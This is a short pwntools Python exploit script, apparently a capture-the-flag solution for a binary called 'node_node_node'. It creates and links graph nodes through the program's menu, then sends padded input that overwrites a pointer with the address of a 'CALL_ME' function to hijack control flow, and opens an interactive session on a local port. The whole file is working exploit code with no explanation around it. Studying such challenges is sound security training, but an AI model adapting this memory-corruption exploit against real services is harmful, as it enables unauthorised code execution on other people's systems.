from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)

elf = context.binary = ELF('node_node_node')

def create_node(id):
    sla(b'>> ', b'1')
    sla(b'Id:', str(id).encode())
def link_node(src, dest):
    sla(b'>> ', b'2')
    sla(b'Node 1', str(src).encode())
    sla(b'Node 2', str(dest).encode())
def save(id):
    sla(b'>> ', b'3')
    sla(b'from', str(id).encode()) 
p  = remote('0', 1337)
#p = process()
#gdb.attach(p, gdbscript='''
#            b *(Read_Graph + 299)
#           c''')

create_node(0)
create_node(1)
create_node(2)

link_node(0, 1)
link_node(0, 2)
link_node(1, 2)

save(0)
CALL_ME = 0x4016ec
for i in range(3):
    sa(b'Data: ', b'A'*0xf)
sa(b'Data: ', b'A' + p64(CALL_ME))


p.interactive()